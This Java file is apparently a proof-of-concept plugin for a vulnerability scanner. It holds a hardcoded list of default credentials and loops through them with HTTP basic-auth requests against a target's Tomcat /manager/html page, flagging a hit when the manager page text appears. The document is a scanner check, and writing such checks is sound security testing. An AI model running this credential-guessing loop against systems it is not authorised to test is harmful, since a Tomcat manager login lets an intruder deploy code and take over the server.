package me.gv7.woodpecker.vuldb.weak_password.poc;

import me.gv7.woodpecker.plugin.IPoc;
import me.gv7.woodpecker.plugin.IResultOutput;
import me.gv7.woodpecker.plugin.IScanResult;
import me.gv7.woodpecker.plugin.ITarget;
import me.gv7.woodpecker.vuldb.weak_password.WeakPasswordCrackPlugin;
import net.dongliu.requests.RawResponse;
import net.dongliu.requests.Requests;

import java.util.HashMap;
import java.util.Map;

public class WeakPasswordCrackPoc implements IPoc {
    String[] flag_array = new String[]{"/manager/html/reload", "Tomcat Web Application Manager"};

    static Map<String,String[]> basicAuthMap = new HashMap<String, String[]>();

    static {
        basicAuthMap.put("tomcat",new String[]{"tomcat", "123456", "11111", ""});
        basicAuthMap.put("admin",new String[]{"admin", "123456","password",""});
        basicAuthMap.put("manager",new String[]{"manager", "123456", "tomcat", "s3cret"});
        basicAuthMap.put("root",new String[]{"root", "123456", "admin"});
    }

    public IScanResult doCheck(ITarget target, IResultOutput iResultOutput) {
        IScanResult scanResult = WeakPasswordCrackPlugin.pluginHelper.createScanResult();
        String vulURL = target.getRootAddress() + "/manager/html";

        for (Map.Entry<String, String[]> entry:basicAuthMap.entrySet()){
            String username = entry.getKey();
            for (String password:entry.getValue()){
                RawResponse response = Requests.get(vulURL).basicAuth(username, password).verify(false).send();
                if(response.statusCode() == 404){
                    String msg = String.format("%s is 404",vulURL);
                    scanResult.setExists(false);
                    scanResult.setMsg(msg);
                    iResultOutput.infoPrintln(msg);
                    return scanResult;}else if(response.statusCode() == 401 || response.getStatusCode() == 403){
                    String msg = String.format("username:[%s],password:[%s] error status:[%d]",username,password,response.getStatusCode());
                    iResultOutput.infoPrintln(msg);
                }else{
                    String respBody = response.readToText();
                    // 判断返回内容是否有关键字
                    for(String flag:flag_array){
                        if(respBody.contains(flag)){
                            String msg = String.format("username:[%s],password:[%s],response include flag:[%s]",username,password,flag);
                            scanResult.setExists(true);
                            scanResult.setMsg(msg);
                            iResultOutput.infoPrintln(msg);
                            return scanResult;
                        }else{
                            String msg = String.format("username:[%s],password:[%s],response not include flag",username,password);
                            iResultOutput.infoPrintln(msg);
                        }
                    }
                }
            }

        }
        return scanResult;
    }
}
